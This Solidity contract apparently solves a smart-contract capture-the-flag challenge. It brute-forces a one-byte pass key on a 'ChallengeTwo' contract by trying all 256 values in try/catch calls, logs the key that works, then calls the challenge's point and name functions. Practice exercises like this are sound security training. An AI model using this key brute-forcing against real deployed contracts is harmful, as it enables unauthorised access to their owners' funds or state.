// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import "./ChallengeTwo.sol";

contract Attack {
    ChallengeTwo challengeTwo;

    event LogKey(uint8 key);

    constructor(address _challengeTwoAddress) {
        challengeTwo = ChallengeTwo(_challengeTwoAddress);
    }

    function bruteForcePassKey() external {
        for (uint8 _key=0; _key<256; _key++) {
            try challengeTwo.passKey(_key) {
                emit LogKey(_key);
                break;
            } catch {
                // Ignore the error and continue with the next key
            }
        }
    }

    function getEnoughPoint(string memory _name) external {
        challengeTwo.getENoughPoint(_name);
    }

    function addYourName() external {
        challengeTwo.addYourName();
    }

    receive() external payable {}
}